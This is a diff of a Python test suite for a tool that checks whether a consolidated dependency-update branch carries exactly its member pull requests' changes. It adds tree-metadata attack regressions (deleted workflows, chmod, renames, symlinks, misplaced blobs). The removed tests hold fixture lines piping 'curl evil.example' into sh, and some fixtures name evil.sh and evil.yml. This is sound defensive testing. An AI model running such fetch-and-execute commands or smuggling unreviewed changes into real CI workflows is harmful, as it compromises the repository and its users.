@@ -1,4 +1,14 @@
-"""Tests for coupled-set consolidation verification."""
+"""Tests for coupled-set consolidation verification.
+
+The union check compares tree metadata from `git diff --raw -z`, not diff
+text. Tests that existed only to pin the behaviour of the old unified-diff
+parser (`+++`-prefixed content, dashes-prefixed removals arming a header
+skip, hunk-state resets) were removed with that parser: they asserted
+properties of a state machine that no longer exists, and there is no state
+machine left for crafted content to steer. What replaces them is the block
+of attack regressions below, which covers what the text check structurally
+could not see -- deletions, modes, renames, and file identity.
+"""
 
 import json
 
@@ -6,69 +16,353 @@ import pytest
 
 from scripts.security import dep_triage_consolidate as dcon
 
-MEMBER_A = """\
---- a/.github/workflows/codeql.yml
-+++ b/.github/workflows/codeql.yml
-@@ -1,3 +1,3 @@
--      uses: github/codeql-action/init@aaa # v4.37.9
-+      uses: github/codeql-action/init@bbb # v4.38.0
-"""
+BLOB_PAYLOADQ_OLD = "a" * 40
+BLOB_PAYLOADQ_NEW = "b" * 40
+BLOB_QUALITY_OLD = "c" * 40
+BLOB_QUALITY_NEW = "d" * 40
+BLOB_PAYLOAD = "e" * 40
+BLOB_PAYLOADQ_NEWLANK = "f" * 40
+ZEROS = "0" * 40
 
-MEMBER_B = """\
---- a/.github/workflows/codeql.yml
-+++ b/.github/workflows/codeql.yml
-@@ -10,3 +10,3 @@
--      uses: github/codeql-action/analyze@aaa # v4.37.9
-+      uses: github/codeql-action/analyze@bbb # v4.38.0
-"""
+CODEQL = ".github/workflows/codeql.yml"
+QUALITY = ".github/workflows/code-quality.yml"
 
 
-def test_added_lines_extracts_only_additions():
-    assert dcon.added_lines(MEMBER_A) == {
-        "      uses: github/codeql-action/init@bbb # v4.38.0"
-    }
+def raw(*records):
+    """Build `git diff --raw -z` output from (meta..., *paths) tuples.
+
+    Each record is ``(oldmode, newmode, oldsha, newsha, status, *paths)``.
+    The real command emits a trailing NUL after the final field, so this does
+    too -- a parser that only worked on input without it would be parsing
+    something git never produces.
+    """
+    fields = []
+    for record in records:
+        fields.append(":%s %s %s %s %s" % tuple(record[:5]))
+        fields.extend(record[5:])
+    return "".join(f + "\0" for f in fields)
 
 
-def test_added_lines_ignores_file_headers():
-    assert not any("+++" in line for line in dcon.added_lines(MEMBER_A))
+# PR #450 bumps codeql-action/init, in codeql.yml. Its PR diff has two hunks
+# (the `uses:` line and the pinned-version comment), but `--raw` reports one
+# entry per *path*: what is compared is the file's resulting blob, so hunk
+# count is not part of the comparison and cannot be gamed by splitting a
+# change across more of them.
+MEMBER_450 = raw(
+    ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
+)
+# PR #452 bumps codeql-action/upload-sarif, which lives in a different file.
+MEMBER_452 = raw(("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY))
+COMBINED = raw(
+    ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL),
+    ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
+)
 
 
-def test_verify_union_accepts_exact_union():
-    # A real `git diff` of a branch touching two hunks in one file emits a
-    # single header pair followed by both `@@` hunks -- never two header
-    # pairs for the same file back to back. Naively concatenating MEMBER_A
-    # and MEMBER_B (each a complete standalone diff) would repeat the header,
-    # which `git diff` never does and which valid diff parsing need not
-    # tolerate.
-    combined = (
-        "--- a/.github/workflows/codeql.yml\n"
-        "+++ b/.github/workflows/codeql.yml\n"
-        "@@ -1,3 +1,3 @@\n"
-        "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
-        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
-        "@@ -10,3 +10,3 @@\n"
-        "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
-        "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
-    )
-    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], combined)
+# --------------------------------------------------------------------------
+# The legitimate path
+# --------------------------------------------------------------------------
+
+
+def test_verify_union_accepts_an_exact_union():
+    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], COMBINED)
     assert ok and not missing and not extra
 
 
-def test_verify_union_rejects_missing_member_change():
-    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], MEMBER_A)
-    assert not ok
-    assert "      uses: github/codeql-action/analyze@bbb # v4.38.0" in missing
+def test_verify_union_accepts_a_two_hunk_single_file_consolidation():
+    """A member whose PR edits one file in two places still verifies.
 
-
-def test_verify_union_rejects_unexplained_extra_change():
-    sneaky = (
-        MEMBER_A
-        + MEMBER_B
-        + ("--- a/x\n+++ b/x\n@@ -1 +1 @@\n+      run: curl evil.example\n")
+    Two hunks collapse into one `--raw` entry, because the entry describes
+    the file's resulting content. The union check is comparing end states,
+    not counting edits.
+    """
+    member = raw(
+        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
     )
-    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], sneaky)
+    ok, missing, extra = dcon.verify_union([member], member)
+    assert ok and not missing and not extra
+
+
+def test_verify_union_accepts_a_member_that_legitimately_adds_a_file():
+    member = raw(("000000", "100644", ZEROS, BLOB_PAYLOADQ_NEW, "A", "new.yml"))
+    ok, _, _ = dcon.verify_union([member], member)
+    assert ok
+
+
+def test_verify_union_reports_a_member_change_the_branch_does_not_carry():
+    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], MEMBER_450)
     assert not ok
-    assert "      run: curl evil.example" in extra
+    assert dcon.TreeEntry(QUALITY, "M", "100644", BLOB_QUALITY_NEW) in missing
+    assert not extra
+
+
+# --------------------------------------------------------------------------
+# Attack regressions
+#
+# Each of these six passed the previous added-line text check. The first
+# three are invisible to any `+`-line comparison; the fourth defeated it by
+# discarding the file a line landed in; the last two by discarding lines
+# that were empty after stripping.
+# --------------------------------------------------------------------------
+
+
+def test_attack_deleting_a_security_workflow_is_reported():
+    """A deletion is not an added line, so the text check never saw it."""
+    combined = COMBINED + raw(
+        (
+            "100644",
+            "000000",
+            BLOB_PAYLOAD,
+            ZEROS,
+            "D",
+            ".github/workflows/security-scan.yml",
+        )
+    )
+    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert (
+        dcon.TreeEntry(".github/workflows/security-scan.yml", "D", "000000", ZEROS)
+        in extra
+    )
+
+
+def test_attack_making_a_script_executable_is_reported():
+    """A mode change alters no line at all; only the mode bits move."""
+    combined = COMBINED + raw(
+        ("100644", "100755", BLOB_PAYLOAD, BLOB_PAYLOAD, "M", "scripts/deploy.sh")
+    )
+    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert dcon.TreeEntry("scripts/deploy.sh", "M", "100755", BLOB_PAYLOAD) in extra
+
+
+def test_attack_chmod_on_a_members_own_file_is_reported():
+    """Sharper than the above: the path *is* one a member changed.
+
+    It cannot be caught by noticing an unfamiliar path, and the blob is the
+    member's own. Only the mode differs, so this fails unless mode is part
+    of the compared entry.
+    """
+    combined = raw(
+        ("100644", "100755", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL),
+        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
+    )
+    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert dcon.TreeEntry(CODEQL, "M", "100755", BLOB_PAYLOADQ_NEW) in extra
+    assert dcon.TreeEntry(CODEQL, "M", "100644", BLOB_PAYLOADQ_NEW) in missing
+
+
+def test_attack_renaming_a_workflow_out_of_the_workflows_directory_is_reported():
+    """Under `--no-renames` a move is a deletion plus a creation.
+
+    Both halves are unexplained: the workflow stops being a workflow, and a
+    file appears where no member put one.
+    """
+    combined = raw(
+        ("100644", "000000", BLOB_PAYLOADQ_OLD, ZEROS, "D", CODEQL),
+        ("000000", "100644", ZEROS, BLOB_PAYLOADQ_OLD, "A", "docs/codeql.yml"),
+        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
+    )
+    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert dcon.TreeEntry("docs/codeql.yml", "A", "100644", BLOB_PAYLOADQ_OLD) in extra
+    assert dcon.TreeEntry(CODEQL, "D", "000000", ZEROS) in extra
+
+
+def test_attack_rename_reported_even_when_git_detects_it_as_a_rename():
+    """The same move, reported by git in its `R` form rather than as D+A.
+
+    `consolidate_family` passes `--no-renames`, but `verify_union` is given
+    whatever the injected runner returns, so the `R` form must be caught
+    too -- including the disappearance of the source path.
+    """
+    combined = raw(
+        (
+            "100644",
+            "100644",
+            BLOB_PAYLOADQ_OLD,
+            BLOB_PAYLOADQ_OLD,
+            "R100",
+            CODEQL,
+            "docs/codeql.yml",
+        ),
+        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
+    )
+    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert dcon.TreeEntry(CODEQL, "D", "000000", ZEROS) in extra
+    assert dcon.TreeEntry("docs/codeql.yml", "R", "100644", BLOB_PAYLOADQ_OLD) in extra
+
+
+def test_attack_approved_content_landing_in_a_different_file_is_reported():
+    """The blob is byte-identical to an approved one -- in the wrong file.
+
+    This is the case that most directly killed the text check: comparing
+    added lines as bare strings threw away the path, so an approved line
+    satisfied the check no matter which file it was written into.
+    """
+    combined = COMBINED + raw(
+        (
+            "000000",
+            "100644",
+            ZEROS,
+            BLOB_PAYLOADQ_NEW,
+            "A",
+            ".github/workflows/evil.yml",
+        )
+    )
+    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert (
+        dcon.TreeEntry(".github/workflows/evil.yml", "A", "100644", BLOB_PAYLOADQ_NEW)
+        in extra
+    )
+
+
+def test_attack_a_new_file_whose_only_added_line_is_blank_is_reported():
+    """The old check dropped lines that were empty after stripping.
+
+    A file is a tree entry whether or not its contents amount to anything,
+    and an empty file in `.github/workflows/` is still a file an attacker
+    can grow in a later commit.
+    """
+    combined = COMBINED + raw(
+        (
+            "000000",
+            "100644",
+            ZEROS,
+            BLOB_PAYLOADQ_NEWLANK,
+            "A",
+            ".github/workflows/placeholder.yml",
+        )
+    )
+    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert (
+        dcon.TreeEntry(
+            ".github/workflows/placeholder.yml", "A", "100644", BLOB_PAYLOADQ_NEWLANK
+        )
+        in extra
+    )
+
+
+def test_attack_a_whitespace_only_addition_to_a_members_file_is_reported():
+    """Whitespace-only additions were stripped to nothing and discarded.
+
+    Applied to a file a member legitimately changed, so novelty of the path
+    cannot catch it: the entry differs only in the blob, which is exactly
+    what a content hash is for.
+    """
+    blob_with_trailing_whitespace = "9" * 40
+    combined = raw(
+        (
+            "100644",
+            "100644",
+            BLOB_PAYLOADQ_OLD,
+            blob_with_trailing_whitespace,
+            "M",
+            CODEQL,
+        ),
+        ("100644", "100644", BLOB_QUALITY_OLD, BLOB_QUALITY_NEW, "M", QUALITY),
+    )
+    ok, missing, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert dcon.TreeEntry(CODEQL, "M", "100644", blob_with_trailing_whitespace) in extra
+    assert dcon.TreeEntry(CODEQL, "M", "100644", BLOB_PAYLOADQ_NEW) in missing
+
+
+def test_attack_a_file_swapped_for_a_symlink_is_reported():
+    """A type change (`T`) shows up as a mode of 120000."""
+    combined = COMBINED + raw(
+        (
+            "100644",
+            "120000",
+            BLOB_PAYLOAD,
+            BLOB_PAYLOADQ_NEWLANK,
+            "T",
+            "config/settings.yml",
+        )
+    )
+    ok, _, extra = dcon.verify_union([MEMBER_450, MEMBER_452], combined)
+    assert not ok
+    assert (
+        dcon.TreeEntry("config/settings.yml", "T", "120000", BLOB_PAYLOADQ_NEWLANK)
+        in extra
+    )
+
+
+def test_verify_union_reports_content_added_when_no_member_contributed():
+    ok, _, extra = dcon.verify_union([], COMBINED)
+    assert not ok
+    assert len(extra) == 2
+
+
+# --------------------------------------------------------------------------
+# Contested paths
+# --------------------------------------------------------------------------
+
+
+def test_verify_union_reports_a_path_two_members_touched():
+    """Two members editing one file cannot be reconciled from hashes.
+
+    The branch's blob for that path is git's merge of both members' blobs
+    and equals neither. Reporting it is the only honest outcome; silently
+    accepting whatever the merge produced would be a hole in exactly the
+    file every member of the family cares about.
+    """
+    member_a = raw(
+        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
+    )
+    member_b = raw(("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL))
+    merged = raw(
+        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEWLANK, "M", CODEQL)
+    )
+    ok, missing, extra = dcon.verify_union([member_a, member_b], merged)
+    assert not ok
+    assert dcon.ContestedPath(CODEQL, 2) in extra
+
+
+def test_contested_path_is_reported_once_not_as_a_pile_of_mismatches():
+    """One clear signal, so it does not read as an attack."""
+    member_a = raw(
+        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
+    )
+    member_b = raw(("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL))
+    merged = raw(
+        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEWLANK, "M", CODEQL)
+    )
+    _, missing, extra = dcon.verify_union([member_a, member_b], merged)
+    assert extra == {dcon.ContestedPath(CODEQL, 2)}
+    assert not missing
+
+
+def test_contested_path_repr_tells_the_operator_to_review_by_hand():
+    text = repr(dcon.ContestedPath(CODEQL, 3))
+    assert CODEQL in text
+    assert "3 member" in text
+    assert "by hand" in text
+
+
+def test_contested_path_does_not_mask_an_unrelated_extra_entry():
+    """A contested path must not become a blanket amnesty for the branch."""
+    member_a = raw(
+        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", CODEQL)
+    )
+    member_b = raw(("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL))
+    merged = raw(
+        ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEWLANK, "M", CODEQL),
+        ("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"),
+    )
+    ok, _, extra = dcon.verify_union([member_a, member_b], merged)
+    assert not ok
+    assert dcon.TreeEntry("evil.sh", "A", "100644", BLOB_PAYLOAD) in extra
+    assert dcon.ContestedPath(CODEQL, 2) in extra
+
+
+# --------------------------------------------------------------------------
+# Naming, grouping, PR body
+# --------------------------------------------------------------------------
 
 
 def test_branch_name_is_slugified():
@@ -92,119 +386,6 @@ def test_branch_name_slugifies_an_npm_requirement_range_version():
     slug = branch.split("/", 1)[1]
     assert not slug.startswith("-")
     assert not slug.endswith("-")
-
-
-def test_added_lines_preserves_indentation():
-    """Indentation is semantics in YAML, so it is part of the comparison."""
-    diff = (
-        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
-        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
-    )
-    assert dcon.added_lines(diff) == {
-        "      uses: github/codeql-action/init@bbb # v4.38.0"
-    }
-
-
-def test_verify_union_rejects_a_line_relocated_to_another_indent_level():
-    """Re-adding an approved line at a different depth is a different change."""
-    member = (
-        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
-        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
-    )
-    relocated = (
-        "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
-        "+uses: github/codeql-action/init@bbb # v4.38.0\n"
-    )
-    ok, missing, extra = dcon.verify_union([member], relocated)
-    assert not ok
-    assert missing and extra
-
-
-def test_added_lines_reports_content_beginning_with_plus_signs():
-    """A `+++`-prefixed raw line is a header only after a `---` line."""
-    diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n" "+++curl evil.example | sh\n"
-    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
-
-
-def test_verify_union_rejects_smuggled_plus_prefixed_content():
-    sneaky = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+++curl evil.example | sh\n"
-    ok, missing, extra = dcon.verify_union([], sneaky)
-    assert not ok
-    assert "++curl evil.example | sh" in extra
-
-
-def test_added_lines_reports_payload_after_a_removed_dashes_line():
-    """A removed line starting with dashes must not arm the header skip."""
-    diff = (
-        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
-        "---smuggled-removed-marker\n"
-        "+++curl evil.example | sh\n"
-    )
-    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
-
-
-def test_verify_union_rejects_payload_hidden_behind_a_removed_dashes_line():
-    diff = (
-        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
-        "---smuggled-removed-marker\n"
-        "+++curl evil.example | sh\n"
-    )
-    ok, missing, extra = dcon.verify_union([], diff)
-    assert not ok
-    assert "++curl evil.example | sh" in extra
-
-
-def test_added_lines_skips_headers_in_a_multi_file_git_diff():
-    """Both genuine header pairs are skipped; both added lines are reported."""
-    diff = (
-        "diff --git a/x.yml b/x.yml\n--- a/x.yml\n+++ b/x.yml\n@@ -1 +1 @@\n"
-        "+      first: one\n"
-        "diff --git a/y.yml b/y.yml\n--- a/y.yml\n+++ b/y.yml\n@@ -1 +1 @@\n"
-        "+      second: two\n"
-    )
-    assert dcon.added_lines(diff) == {"      first: one", "      second: two"}
-
-
-def test_added_lines_skips_a_dev_null_header_pair():
-    diff = (
-        "diff --git a/n.yml b/n.yml\n--- /dev/null\n+++ b/n.yml\n@@ -0,0 +1 @@\n"
-        "+      created: yes\n"
-    )
-    assert dcon.added_lines(diff) == {"      created: yes"}
-
-
-def test_added_lines_reports_payload_when_no_hunk_marker_is_present():
-    """Outside a hunk, only a real `--- ` header may arm the skip."""
-    diff = "---smuggled\n+++curl evil.example | sh\n"
-    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
-
-
-def test_verify_union_rejects_payload_in_a_hunkless_diff():
-    diff = "---smuggled\n+++curl evil.example | sh\n"
-    ok, missing, extra = dcon.verify_union([], diff)
-    assert not ok
-    assert "++curl evil.example | sh" in extra
-
-
-def test_added_lines_reports_payload_after_a_removed_dashes_line_with_space():
-    """A removed line whose content starts '-- ' must not arm the header skip."""
-    diff = (
-        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
-        "--- something\n"
-        "+++curl evil.example | sh\n"
-    )
-    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
-
-
-def test_verify_union_rejects_payload_behind_a_spaced_dashes_removal():
-    diff = (
-        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
-        "--- something\n"
-        "+++curl evil.example | sh\n"
-    )
-    ok, missing, extra = dcon.verify_union([], diff)
-    assert not ok
-    assert "++curl evil.example | sh" in extra
 
 
 def test_families_from_decisions_groups_coupled_members():
@@ -245,6 +426,23 @@ def test_consolidation_body_does_not_claim_members_were_closed():
     assert "left open" in body.lower()
 
 
+def test_consolidation_body_describes_what_was_actually_verified():
+    """The body must not claim more than the check establishes.
+
+    It previously told reviewers the branch's *added lines* had been
+    verified equal to the members' added lines, which overstated a check
+    that could not see deletions, modes or paths at all.
+    """
+    body = dcon.consolidation_body("github/codeql-action", "4.38.0", [450, 452])
+    assert "added lines" not in body.lower()
+    assert "mode" in body.lower()
+
+
+# --------------------------------------------------------------------------
+# consolidate_family orchestration
+# --------------------------------------------------------------------------
+
+
 class FakeRun:
     """Records commands; returns canned stdout per matched prefix."""
 
@@ -268,44 +466,18 @@ class FakeRun:
         return any(needle in " ".join(c) for c in self.calls)
 
 
-DIFF_A = (
-    "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
-    "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
-    "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
-)
-DIFF_B = (
-    "--- a/w.yml\n+++ b/w.yml\n@@ -9 +9 @@\n"
-    "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
-    "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
-)
-# A real `git diff` of a branch that merged both member PRs emits a single
-# header pair for the shared file followed by both hunks -- never two header
-# pairs back to back (see test_verify_union_accepts_exact_union above, which
-# documents the same point). Naively concatenating DIFF_A and DIFF_B as
-# standalone diffs would repeat the header pair, which `added_lines` -- by
-# design, per its docstring -- treats as content once already inside a hunk
-# with no `diff --git` separator to reset the state. That is the correct,
-# security-conservative direction (over-report, never silently drop an
-# addition), but it means these two tests need the realistic single-header
-# combined diff, not a naive concatenation of the two member diffs.
-COMBINED = (
-    "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
-    "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
-    "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
-    "@@ -9 +9 @@\n"
-    "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
-    "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
-)
+def _happy_run(**overrides):
+    responses = {
+        "origin/main...pr-450": MEMBER_450,
+        "origin/main...pr-452": MEMBER_452,
+        "origin/main...HEAD": COMBINED,
+    }
+    responses.update(overrides.pop("responses", {}))
+    return FakeRun(responses=responses, **overrides)
 
 
 def test_consolidate_family_opens_pr_when_union_matches():
-    run = FakeRun(
-        responses={
-            "diff origin/main...pr-450": DIFF_A,
-            "diff origin/main...pr-452": DIFF_B,
-            "diff origin/main...HEAD": COMBINED,
-        }
-    )
+    run = _happy_run()
     ok, message = dcon.consolidate_family(
         "github/codeql-action", "4.38.0", [450, 452], run
     )
@@ -320,57 +492,115 @@ def test_consolidate_family_opens_pr_when_union_matches():
     )
 
 
-def test_consolidate_family_refuses_when_union_has_extra_lines():
-    """An added line no member introduced is an unreviewed change."""
-    sneaky = COMBINED + (
-        "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n"
-        "+      run: curl evil.example\n"
-    )
-    run = FakeRun(
-        responses={
-            "diff origin/main...pr-450": DIFF_A,
-            "diff origin/main...pr-452": DIFF_B,
-            "diff origin/main...HEAD": sneaky,
-        }
-    )
+def test_consolidate_family_asks_git_for_tree_metadata_not_diff_text():
+    """The flags are the control. `--raw -z` is what makes the comparison
+    structural; `--no-abbrev` prevents git shortening hashes by a length
+    that varies with repository size; `--no-renames` makes a move a
+    deterministic D+A on both sides instead of a similarity heuristic whose
+    result depends on the size of the surrounding diff."""
+    run = _happy_run()
+    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
+    diffs = [c for c in run.calls if c[:2] == ["git", "diff"]]
+    assert diffs, "no git diff was run"
+    for call in diffs:
+        assert "--raw" in call
+        assert "-z" in call
+        assert "--no-abbrev" in call
+        assert "--no-renames" in call
+
+
+def test_consolidate_family_refuses_when_the_branch_carries_an_extra_entry():
+    """A change no member introduced is an unreviewed change."""
+    sneaky = COMBINED + raw(("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"))
+    run = _happy_run(responses={"origin/main...HEAD": sneaky})
     ok, message = dcon.consolidate_family(
         "github/codeql-action", "4.38.0", [450, 452], run
     )
     assert not ok
     assert "union" in message.lower()
+    assert "evil.sh" in message
     assert not run.ran("pr create")
     # Defense in depth: a regression that moved the push above the union
     # check would still be caught here even if `pr create` were guarded.
     assert not run.ran("push")
 
 
-def test_consolidate_family_returns_to_main_after_a_union_mismatch():
-    sneaky = COMBINED + (
-        "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n"
-        "+      run: curl evil.example\n"
+def test_consolidate_family_refuses_when_the_branch_deletes_a_workflow():
+    """The deletion case, driven through the orchestration rather than
+    through `verify_union` alone -- the gate must be wired to the push."""
+    sneaky = COMBINED + raw(
+        (
+            "100644",
+            "000000",
+            BLOB_PAYLOAD,
+            ZEROS,
+            "D",
+            ".github/workflows/security-scan.yml",
+        )
     )
-    run = FakeRun(
+    run = _happy_run(responses={"origin/main...HEAD": sneaky})
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert not ok
+    assert "security-scan.yml" in message
+    assert not run.ran("pr create")
+    assert not run.ran("push")
+
+
+def test_consolidate_family_refuses_when_two_members_touch_one_path():
+    """Reported for human attention, not reconciled and not pushed."""
+    run = _happy_run(
         responses={
-            "diff origin/main...pr-450": DIFF_A,
-            "diff origin/main...pr-452": DIFF_B,
-            "diff origin/main...HEAD": sneaky,
+            "origin/main...pr-452": raw(
+                ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOAD, "M", CODEQL)
+            ),
+            "origin/main...HEAD": raw(
+                (
+                    "100644",
+                    "100644",
+                    BLOB_PAYLOADQ_OLD,
+                    BLOB_PAYLOADQ_NEWLANK,
+                    "M",
+                    CODEQL,
+                )
+            ),
         }
     )
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert not ok
+    assert "CONTESTED" in message
+    assert CODEQL in message
+    assert not run.ran("pr create")
+    assert not run.ran("push")
+
+
+def test_consolidate_family_returns_to_main_after_a_union_mismatch():
+    sneaky = COMBINED + raw(("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "evil.sh"))
+    run = _happy_run(responses={"origin/main...HEAD": sneaky})
     ok, _ = dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
     assert not ok
     assert run.ran("switch main")
 
 
+def test_consolidate_family_refuses_when_the_raw_diff_is_unreadable():
+    """A check that cannot run is not a check that passed."""
+    run = _happy_run(responses={"origin/main...HEAD": "not a raw diff at all"})
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert not ok
+    assert "unreadable" in message.lower()
+    assert not run.ran("pr create")
+    assert not run.ran("push")
+    assert run.ran("switch main")
+
+
 def test_consolidate_family_returns_cleanly_when_pr_create_fails():
     """Re-running a family whose PR already exists must not raise."""
-    run = FakeRun(
-        responses={
-            "diff origin/main...pr-450": DIFF_A,
-            "diff origin/main...pr-452": DIFF_B,
-            "diff origin/main...HEAD": COMBINED,
-        },
-        fail_on=("pr create",),
-    )
+    run = _happy_run(fail_on=("pr create",))
     ok, message = dcon.consolidate_family(
         "github/codeql-action", "4.38.0", [450, 452], run
     )
@@ -380,14 +610,7 @@ def test_consolidate_family_returns_cleanly_when_pr_create_fails():
 
 
 def test_consolidate_family_returns_cleanly_when_push_fails():
-    run = FakeRun(
-        responses={
-            "diff origin/main...pr-450": DIFF_A,
-            "diff origin/main...pr-452": DIFF_B,
-            "diff origin/main...HEAD": COMBINED,
-        },
-        fail_on=("push",),
-    )
+    run = _happy_run(fail_on=("push",))
     ok, message = dcon.consolidate_family(
         "github/codeql-action", "4.38.0", [450, 452], run
     )
@@ -396,15 +619,15 @@ def test_consolidate_family_returns_cleanly_when_push_fails():
     assert run.ran("switch main")
 
 
-def test_consolidate_family_refuses_when_no_member_contributed_an_added_line():
+def test_consolidate_family_refuses_when_no_member_contributed_a_change():
     """verify_union([], "") passes vacuously (True, set(), set()). If every
     member diff came back empty, that vacuous pass must not let an empty
     branch and an empty PR get created."""
     run = FakeRun(
         responses={
-            "diff origin/main...pr-450": "",
-            "diff origin/main...pr-452": "",
-            "diff origin/main...HEAD": "",
+            "origin/main...pr-450": "",
+            "origin/main...pr-452": "",
+            "origin/main...HEAD": "",
         }
     )
     ok, message = dcon.consolidate_family(
@@ -413,11 +636,12 @@ def test_consolidate_family_refuses_when_no_member_contributed_an_added_line():
     assert not ok
     assert "no member contributed" in message.lower()
     assert not run.ran("pr create")
+    assert not run.ran("push")
 
 
 def test_consolidate_family_aborts_on_merge_conflict():
     run = FakeRun(
-        responses={"diff origin/main...pr-450": DIFF_A},
+        responses={"origin/main...pr-450": MEMBER_450},
         fail_on=("merge --no-edit pr-452",),
     )
     ok, message = dcon.consolidate_family(
@@ -427,19 +651,19 @@ def test_consolidate_family_aborts_on_merge_conflict():
     assert "conflict" in message.lower()
     assert run.ran("merge --abort")
     assert not run.ran("pr create")
+    assert run.ran("switch main")
 
 
 def test_consolidate_family_never_merges_or_approves():
-    run = FakeRun(
-        responses={
-            "diff origin/main...pr-450": DIFF_A,
-            "diff origin/main...pr-452": DIFF_B,
-            "diff origin/main...HEAD": COMBINED,
-        }
-    )
+    run = _happy_run()
     dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
     for forbidden in ("pr merge", "pr review", "pr ready"):
         assert not run.ran(forbidden), f"must never run: {forbidden}"
+
+
+# --------------------------------------------------------------------------
+# CLI
+# --------------------------------------------------------------------------
 
 
 def _write_fixtures(tmp_path):
@@ -541,41 +765,30 @@ def test_main_execute_reports_error_and_nonzero_on_family_failure(
 # Structural raw-diff parsing
 # --------------------------------------------------------------------------
 
-BLOB_A = "1" * 40
-BLOB_B = "2" * 40
-BLOB_C = "3" * 40
-ZEROS = "0" * 40
-
-
-def raw(*records):
-    """Build `git diff --raw -z` output from (meta..., *paths) tuples.
-
-    Each record is ``(oldmode, newmode, oldsha, newsha, status, *paths)``.
-    The real command emits a trailing NUL after the final field, so this does
-    too -- a parser that only works on input without it would be parsing
-    something git never produces.
-    """
-    fields = []
-    for record in records:
-        fields.append(":%s %s %s %s %s" % tuple(record[:5]))
-        fields.extend(record[5:])
-    return "".join(f + "\0" for f in fields)
-
 
